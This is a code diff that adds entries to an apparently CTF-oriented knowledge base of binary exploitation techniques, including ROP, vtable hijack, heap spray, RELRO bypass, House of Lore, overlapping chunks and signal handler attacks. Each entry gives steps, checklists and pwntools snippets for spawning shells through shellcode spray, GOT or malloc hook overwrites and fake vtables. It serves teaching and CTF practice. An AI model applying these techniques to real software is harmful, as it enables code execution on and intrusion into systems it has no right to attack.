+      '[ ] Find pop rdi; ret gadget',
+      '[ ] Find system() or execve() address',
+      '[ ] Add ret gadget for 16-byte stack alignment',
+      '[ ] Build chain and send payload',
+    ],
+    vulnerabilityTypes: ['stack-overflow', 'rop', 'code-reuse'],
+    references: [
+      { description: 'Return Oriented Programming (CTF 101)', url: 'https://ctf101.org/binary-exploitation/return-oriented-programming/' },
+      { description: 'ROPgadget', url: 'https://github.com/JonathanSalwan/ROPgadget' },
+    ],
+  },
+
+  vtable_hijack_detailed: {
+    id: 'vtable_hijack_detailed',
+    name: 'VTable Hijack (Detailed)',
+    category: 'technique',
+    class: 'Control Flow Hijack',
+    description: 'In C++ binaries, virtual function calls go through a vtable pointer stored at the start of each object. After a use-after-free, the attacker can overwrite the vtable pointer to point to a fake vtable under their control. When the program calls a virtual method on the dangling pointer, it dispatches through the fake vtable, executing attacker-chosen code. Modern glibc validates vtable pointers against known ranges, making the _IO_FILE vtable attack require targeting _IO_wstr_jumps/_IO_wfile_jumps instead.',
+    preconditions: {
+      summary: 'A use-after-free on a C++ object with virtual methods. After freeing the object, the attacker reallocates controlled data over the freed slot, overwrites the vtable pointer, and triggers a virtual function call.',
+      required: [
+        'C++ object with virtual methods (vtable pointer at offset 0)',
+        'Use-after-free or type confusion allowing vtable overwrite',
+        'Ability to reallocate same-size object over freed slot',
+        'Trigger for virtual method call on the dangling pointer',
+      ],
+      detectionSteps: [
+        'Run in GDB: info vtbl <class_name> → see vtable layout',
+        'Look for virtual keyword in source or vptr in Ghidra',
+        'Free + allocate same size → type confusion',
+        'Trigger virtual call: dangling_ptr->virtual_method()',
+      ],
+    },
+    exploitationPaths: [
+      {
+        name: 'UAF → Fake Vtable → Code Execution',
+        description: 'Free C++ object, reallocate with controlled data, point vtable to controlled memory containing a function pointer.',
+        steps: [
+          'Free the C++ object (dangling pointer created)',
+          'Allocate string or buffer of same size over freed slot',
+          'Write fake vtable pointer at offset 0 pointing to attacker-controlled area',
+          'At fake vtable offset N, write target function address (e.g., system)',
+          'Trigger virtual call: program calls dangling_ptr->method() → calls system()',
+        ],
+        tools: ['pwndbg', 'pwntools', 'Ghidra'],
+        codeSnippet: `# UAF → VTable Hijack
+obj = allocate_object()     # allocate C++ object with vtable
+free(obj)                    # free it (dangling pointer)
+fake = allocate_same_size() # reallocate with attacker data
+
+# Overwrite vtable pointer
+write_qword(fake + 0x00, fake_vtable_addr)
+# Set virtual method entry to system
+write_qword(fake_vtable_addr + METHOD_OFFSET, libc.sym['system'])
+
+# Trigger virtual call → system() runs
+trigger_virtual_call()`,
+        applicableLibc: 'All (glibc < 2.28 easiest)',
+      },
+    ],
+    postconditions: {
+      successIndicators: ['Virtual method call diverted to attacker function', 'Shell spawned or code execution achieved'],
+      artifacts: ['Vtable address', 'Virtual method offset', 'Replacement function address'],
+    },
+    operatorChecklist: [
+      '[ ] Identify C++ class with virtual methods',
+      '[ ] Find vtable pointer offset (usually 0)',
+      '[ ] Find virtual method offset in vtable',
+      '[ ] Free object and reallocate controlled data',
+      '[ ] Write fake vtable pointer',
+      '[ ] Write target function at method offset in fake vtable',
+      '[ ] Trigger virtual call on dangling pointer',
+    ],
+    vulnerabilityTypes: ['use-after-free', 'vtable-hijack', 'cpp-exploit'],
+    references: [
+      { description: 'C++ vtable exploitation' },
+    ],
+  },
+
+  heap_spray_detailed: {
+    id: 'heap_spray_detailed',
+    name: 'Heap Spray (Detailed)',
+    category: 'technique',
+    class: 'Memory Layout Control',
+    description: 'Allocates massive amounts of heap memory filled with a predictable pattern (often NOP sled + shellcode) to place attacker data at a known or guessable address. Used when the attacker knows a jump/call target address but cannot control what is at that address. Commonly paired with use-after-free, vtable hijack, or ROP where a fixed address is needed.',
+    preconditions: {
+      summary: 'The attacker can allocate many heap objects of controlled content and size. Often used with UAF or format string bugs where a pointer needs to point to attacker-controlled data at a predictable address.',
+      required: [
+        'Ability to allocate large numbers of heap objects',
+        'Control over content of allocated objects',
+        'Target address that is predictable (no PIE or leaked address)',
+      ],
+      detectionSteps: [
+        'Check if binary allows large allocations (malloc loops)',
+        'Determine if ASLR can be bypassed (no PIE, or info leak)',
+        'Test with spray pattern: 0x41414141 repeated → check with GDB vmmap',
+      ],
+    },
+    exploitationPaths: [
+      {
+        name: 'NOP Sled + Shellcode Heap Spray',
+        description: 'Spray heap with NOP sled followed by shellcode, then jump to a predicted address.',
+        steps: [
+          'Prepare spray payload: NOP sled (0x90) + shellcode + padding',
+          'Allocate thousands of spray objects to fill the address space',
+          'Predict address: typically heap_base + offset (try multiple)',
+          'Jump to predicted address via UAF/vtable/dangling pointer',
+        ],
+        tools: ['pwntools', 'pwndbg vmmap'],
+        codeSnippet: `from pwn import *
+
+shellcode = asm(shellcraft.sh())
+nop_sled = b'\\x90' * 0x100
+spray_payload = nop_sled + shellcode
+spray_payload = spray_payload.ljust(0x400, b'\\x00')
+
+# Spray 10000 allocations
+for i in range(10000):
+    spray_chunk = malloc(len(spray_payload))
+    write(spray_chunk, spray_payload)
+
+# Predict address (check with GDB vmmap)
+predicted_addr = heap_base + 0x1000
+# Use predicted_addr as jump target in exploit`,
+        applicableLibc: 'All (no PIE / ASLR disabled easiest)',
+      },
+    ],
+    postconditions: {
+      successIndicators: ['Predictable address contains attacker data', 'Jump to sprayed address executes shellcode or ROP'],
+      artifacts: ['Sprayed address range', 'Heap base address'],
+    },
+    operatorChecklist: [
+      '[ ] Determine if ASLR is disabled or address is leakable',
+      '[ ] Prepare spray payload (NOP sled + payload)',
+      '[ ] Allocate enough to cover target address region',
+      '[ ] Verify with GDB: examine memory at predicted address',
+      '[ ] Jump to predicted address via exploit primitive',
+    ],
+    vulnerabilityTypes: ['heap-spray', 'uaf', 'vtable-hijack'],
+    references: [
+      { description: 'Heap Spray technique' },
+    ],
+  },
+
+  relational_bypass: {
+    id: 'relational_bypass_detailed',
+    name: 'RELRO Bypass (Detailed)',
+    category: 'technique',
+    class: 'Defense Bypass',
+    description: 'Bypassing RELRO (Relocation Read-Only) protection. Full RELRO makes the GOT read-only after startup, blocking classic GOT overwrite attacks. No RELRO and Partial RELRO leave the GOT writable. With Full RELRO, attackers must target other writable function pointers: __malloc_hook, __free_hook (glibc < 2.34), or use FSOP (File Stream Oriented Programming) to corrupt _IO_FILE vtables.',
+    preconditions: {
+      summary: 'Identify RELRO level and choose appropriate bypass. With Full RELRO, the standard GOT overwrite path is closed — must find alternative targets.',
+      required: [
+        'checksec to determine RELRO level',
+        'For Full RELRO: writable hook pointers or _IO_FILE structures',
+        'Arbitrary write primitive',
+      ],
+      detectionSteps: [
+        'checksec --file=./binary → check RELRO status',
+        'No RELRO: entire .got.plt is writable — easy GOT overwrite',
+        'Partial RELRO: .got.plt writable, .got read-only — GOT overwrite still works',
+        'Full RELRO: entire GOT is read-only (mprotect) — need alternative target',
+        'readelf -d ./binary | grep BIND_NOW → Full RELRO indicator',
+      ],
+    },
+    exploitationPaths: [
+      {
+        name: 'No/Partial RELRO: GOT Overwrite',
+        description: 'Direct GOT entry overwrite — the classic approach.',
+        steps: [
+          'Find target GOT entry (puts, printf, free, etc.)',
+          'Find replacement function address',
+          'Write replacement address to GOT entry',
+          'Trigger the hijacked function',
+        ],
+        tools: ['pwntools', 'readelf', 'objdump'],
+        codeSnippet: `# Direct GOT overwrite (No/Partial RELRO)
+writes = {elf.got['puts']: libc.sym['system']}
+payload = fmtstr_payload(offset, writes)
+p.sendline(payload)`,
+        applicableLibc: 'All (No/Partial RELRO)',
+      },
+      {
+        name: 'Full RELRO: __malloc_hook / __free_hook',
+        description: 'Bypass Full RELRO by overwriting libc hook pointers that are still writable (glibc < 2.34).',
+        steps: [
+          'Leak libc base address',
+          'Find __malloc_hook or __free_hook address in libc',
+          'Write one_gadget address to the hook',
+          'Trigger malloc() or free() to execute the hook',
+        ],
+        tools: ['pwntools', 'one_gadget', 'pwndbg'],
+        codeSnippet: `# Hook overwrite (Full RELRO, glibc < 2.34)
+malloc_hook = libc.sym['__malloc_hook']
+one_gadget = 0x??????  # from one_gadget tool
+
+arb_write(malloc_hook, one_gadget)
+trigger_malloc(1)  # → calls __malloc_hook → one_gadget → shell`,
+        applicableLibc: 'glibc < 2.34 (hooks removed in 2.34+)',
+      },
+      {
+        name: 'Full RELRO: FSOP / House of Apple',
+        description: 'For modern glibc (2.34+), hooks are gone. Use FSOP or House of Apple to redirect execution through corrupted _IO_FILE structs.',
+        steps: [
+          'Forge or corrupt an _IO_FILE structure',
+          'Point _wide_data to attacker-controlled memory',
+          'Set vtable to _IO_wfile_jumps (within valid range)',
+          'Trigger exit() or assert to invoke _IO_flush_all_lockp',
+        ],
+        tools: ['pwntools', 'pwndbg'],
+        codeSnippet: `# FSOP / House of Apple (glibc 2.34+)
+# Modify _IO_FILE._wide_data to point to fake struct
+# Set vtable to _IO_wfile_jumps + offset
+# Trigger: exit() or assert failure → vtable dispatch → code exec`,
+        applicableLibc: 'glibc 2.34+ (post-hook era)',
+      },
+    ],
+    postconditions: {
+      successIndicators: [
+        'No/Partial: GOT entry overwritten, function hijacked',
+        'Full (hooks): One gadget executed on malloc/free trigger',
+        'Full (FSOP): Code execution via _IO_FILE corruption',
+      ],
+      artifacts: ['RELRO level', 'Target address used', 'Libc base address'],
+    },
+    operatorChecklist: [
+      '[ ] Run checksec to identify RELRO level',
+      '[ ] No/Partial RELRO: plan GOT overwrite',
+      '[ ] Full RELRO + glibc < 2.34: check for __malloc_hook/__free_hook',
+      '[ ] Full RELRO + glibc >= 2.34: plan FSOP / House of Apple',
+      '[ ] Leak libc base before attempting hook/FSOP overwrite',
+    ],
+    vulnerabilityTypes: ['relro-bypass', 'got-overwrite', 'fsop'],
+    references: [
+      { description: 'RELRO Protection and Bypasses' },
+    ],
+  },
+
+  house_of_lore: {
+    id: 'house_of_lore',
+    name: 'House of Lore',
+    category: 'technique',
+    class: 'Heap Exploitation',
+    description: 'Corrupts the smallbin free list by manipulating a freed chunk\'s bk pointer, causing malloc to return an arbitrary address. The attacker places a fake chunk at the target location and links it into the smallbin via bk pointer corruption. When malloc services a request from this smallbin, it follows the corrupted bk chain and returns the fake chunk.',
+    preconditions: {
+      summary: 'Smallbin must have free chunks, and the attacker must be able to corrupt the bk pointer of a freed smallbin chunk. The fake chunk at the target address must have valid size field.',
+      required: [
+        'Smallbin must have entries (not all in fastbin/tcache)',
+        'Ability to corrupt bk pointer of a smallbin chunk',
+        'Fake chunk at target address with valid size field',
+      ],
+      detectionSteps: [
+        'Check if target allocation size falls in smallbin range (not fastbin, not tcache)',
+        'Use calloc or malloc sizes > 0x80 to avoid fastbin/tcache',
+        'In GDB: bins → check smallbin entries',
+      ],
+    },
+    exploitationPaths: [
+      {
+        name: 'Smallbin bk Corruption → Arbitrary Alloc',
+        description: 'Corrupt victim->bk to link a fake chunk into the smallbin, then malloc returns the fake address.',
+        steps: [
+          'Allocate and free a chunk of smallbin size (>0x80)',
+          'Fill tcache for that size to force smallbin usage',
+          'Corrupt the freed smallbin chunk\'s bk pointer to &fake_chunk - 0x10',
+          'Ensure fake_chunk has valid: fake_chunk->fd = victim, fake_chunk->bk = anything',
+          'malloc(smallbin_size) → returns fake_chunk address',
+        ],
+        tools: ['pwndbg bins', 'pwntools', 'GDB'],
+        codeSnippet: `# House of Lore: smallbin bk corruption
+# Fill tcache for target size
+for i in range(7):
+    free(chunks[i])  # fill tcache
+
+# Free victim -> goes to unsorted bin, then smallbin
+free(victim)
+# Corrupt victim->bk
+victim_bk = victim_addr + 8  # offset of bk in malloc_chunk
+arb_write(victim_bk, fake_addr - 0x10)  # fake_chunk must be at fake_addr
+
+# Set up fake chunk: fd = victim, bk = don't care
+arb_write(fake_addr + 0x10, victim_addr)  # fake->fd = victim
+arb_write(fake_addr + 0x18, 0x41414141)  # fake->bk = whatever
+
+# malloc returns fake_addr
+ptr = malloc(smallbin_size)  # returns fake_addr!`,
+        applicableLibc: 'glibc < 2.29 (easier); 2.29+ has extra smallbin checks',
+      },
+    ],
+    postconditions: {
+      successIndicators: ['malloc returns arbitrary address', 'Controlled data at returned pointer'],
+      artifacts: ['Fake chunk address', 'Smallbin chunk address', 'Corrupted bk value'],
+    },
+    operatorChecklist: [
+      '[ ] Ensure target size falls in smallbin range',
+      '[ ] Fill tcache to force smallbin path',
+      '[ ] Corrupt victim->bk to point to fake chunk',
+      '[ ] Set fake->fd = victim for glibc 2.29+ check',
+      '[ ] malloc the target size to get fake chunk address',
+    ],
+    vulnerabilityTypes: ['heap-overflow', 'uaf', 'arbitrary-alloc'],
+    references: [
+      { description: 'House of Lore (how2heap)', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_lore.c' },
+    ],
+  },
+
+  overlapping_chunks_detailed: {
+    id: 'overlapping_chunks_detailed',
+    name: 'Overlapping Chunks (Detailed)',
+    category: 'technique',
+    class: 'Heap Exploitation',
+    description: 'Creates two or more heap allocations that point to overlapping memory regions. The attacker corrupts a chunk\'s size field (via overflow, UAF, or tcache poisoning) so that a subsequent malloc returns memory that overlaps with a still-active chunk. This enables read/write through one allocation to modify the other — leading to tcache poisoning, libc leaks, and arbitrary writes.',
+    preconditions: {
+      summary: 'A heap overflow or UAF allows modifying a chunk\'s size metadata. After corruption, freeing and reallocating creates overlapping regions.',
+      required: [
+        'Heap overflow to corrupt chunk size field, OR',
+        'UAF/double-free to poison tcache/bin lists',
+        'Ability to allocate/free chunks before and after corruption',
+      ],
+      detectionSteps: [
+        'Allocate chunks A, B, C adjacent on heap',
+        'Overflow A to increase B\'s size field',
+        'Free B → now in bin with enlarged size',
+        'malloc(B\'s new size) → returns B\'s region overlapping C',
+      ],
+    },
+    exploitationPaths: [
+      {
+        name: 'Size Corruption → Overlapping Allocation',
+        description: 'Overwrite a chunk\'s size to make it larger, then reallocate to overlap with adjacent chunks.',
+        steps: [
+          'Allocate victim and adjacent chunks',
+          'Overflow into adjacent chunk size field (increase it)',
+          'Free the corrupted chunk → placed in larger size bin',
+          'malloc(corrupted_size) → returns chunk overlapping victim\'s data',
+          'Read/write through overlapping chunk modifies victim\'s fields',
+        ],
+        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
+        codeSnippet: `# Overlapping chunks via size corruption
+A = malloc(0x18)  # chunk of size 0x20
+B = malloc(0x18)  # chunk of size 0x20
+C = malloc(0x418) # large chunk
+
+# Overflow A into B's size field
+overflow_write(A + 0x18 + 8, 0x441)  # B->size = 0x440 (encompasses C)
+
+# Free B → goes to unsorted bin as size 0x440
+free(B)
+
+# Reallocate → overlaps C
+D = malloc(0x430)  # D overlaps C's data!
+# Any write to D offsets >= 0x20 modifies C's content`,
+        applicableLibc: 'All (size corruption is fundamental)',
+      },
+    ],
+    postconditions: {
+      successIndicators: ['Two active pointers point to overlapping memory', 'Data written through one pointer is visible through the other'],
+      artifacts: ['Overlapping chunk addresses', 'Size corruption offset'],
+    },
+    operatorChecklist: [
+      '[ ] Allocate victim and adjacent chunks',
+      '[ ] Corrupt adjacent chunk size field',
+      '[ ] Verify next chunk prev_size matches (for free)',
+      '[ ] Free corrupted chunk → re-allocate overlapping size',
+      '[ ] Confirm overlap: write to new alloc, read from old',
+    ],
+    vulnerabilityTypes: ['heap-overflow', 'uaf', 'overlapping'],
+    references: [
+      { description: 'Overlapping Chunks (how2heap)', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/overlapping_chunks.c' },
+    ],
+  },
+
+  signal_handler_exploit_kb: {
+    id: 'signal_handler_exploit',
+    name: 'Signal Handler Exploitation',
+    category: 'technique',
+    class: 'Async Exploitation',
+    description: 'Abusing signal handlers (SIGALRM, SIGSEGV, etc.) that execute user-controllable code in an asynchronous context. CTF challenges often use alarm() to set a timeout, with a handler that either leaks data (info disclosure) or calls vulnerable functions. The async nature introduces race conditions and re-entrancy issues that can be exploited for UAF or double-fetch attacks.',
+    preconditions: {
+      summary: 'Binary installs a signal handler via signal() or sigaction(). The handler accesses global/heap data that the attacker can influence between the signal delivery and handler execution.',
+      required: [
+        'Signal handler installed (signal()/sigaction())',
+        'Handler accesses shared/global data',
+        'Attacker can influence the data between signal setup and handler execution',
+      ],
+      detectionSteps: [
+        'ltrace ./binary | grep signal → find signal() calls',
+        'In Ghidra: search for signal/sigaction calls',
+        'Check if alarm(N) is used (SIGALRM handler)',
+        'Identify what the handler does: print data? free memory? write?',
+      ],
+    },
+    exploitationPaths: [
+      {
+        name: 'SIGALRM Info Leak',
+        description: 'The alarm handler prints memory content (e.g., stack, heap) — use to leak canary, libc, or heap addresses.',
+        steps: [
+          'Set alarm() before buffer overflow',
+          'Signal fires → handler prints memory content',
+          'Parse leaked values from output',
+          'Use leaks to build final exploit payload',
+        ],
+        tools: ['ltrace', 'strace', 'GDB', 'pwntools'],
+        codeSnippet: `# SIGALRM handler leaks data
+from pwn import *
+p = process('./binary')
+
+# Handler prints canary or libc address after alarm
+leak = p.recvline()  # handler output
+canary = int(leak.strip(), 16)
+
+# Now build overflow with leaked canary
+payload = b'A' * offset + p64(canary) + p64(0) + p64(ret) + p64(system)`,
+        applicableLibc: 'All',
+      },
+      {
+        name: 'Signal Handler UAF / Race Condition',
+        description: 'The handler frees or modifies data that is still being used, creating a UAF or double-fetch window.',
+        steps: [
+          'Send input that starts a long operation',
+          'SIGALRM fires mid-operation, handler frees global buffer',
+          'Reallocate freed buffer with controlled data',
+          'Original operation continues with dangling pointer → UAF',
+        ],
+        tools: ['pwntools', 'GDB', 'pwndbg'],
+        codeSnippet: `# Race condition via signal handler
+from pwn import *
+
+p = process('./binary')
+# Binary does: signal(SIGALRM, handler); alarm(1); gets(buf);
+# Handler does: free(global_ptr); global_ptr = NULL;
+
+# Thread 1: trigger the operation
+p.sendline(b'A' * offset)  # starts long operation
+
+# Signal fires after 1 second:
+# handler frees global_ptr → UAF window opens
+
+# Thread 2/next request: allocate controlled data
+p.sendline(b'B' * size)  # fills freed slot with our data
+
+# Original operation uses dangling pointer with our data`,
+        applicableLibc: 'All (race condition dependent)',
+      },
+    ],
+    postconditions: {
+      successIndicators: ['Signal handler leaks memory addresses', 'Race condition achieved: UAF or double-fetch confirmed'],
+      artifacts: ['Leaked addresses from handler', 'Signal handler function address'],
+    },
+    operatorChecklist: [
+      '[ ] Identify signal handlers with ltrace/strace',
+      '[ ] Determine what data handler accesses',
+      '[ ] Check if handler leaks, frees, or modifies shared data',
+      '[ ] If leak: parse leaked values and build exploit',
+      '[ ] If UAF: exploit the race window between signal and return',
+    ],
+    vulnerabilityTypes: ['signal-handler', 'race-condition', 'info-leak', 'uaf'],
+    references: [
+      { description: 'Signal Handler Exploitation in CTF' },
+    ],
+  },
+};
 export const TECHNIQUES_LIST = Object.values(PWN_KNOWLEDGE_BASE);
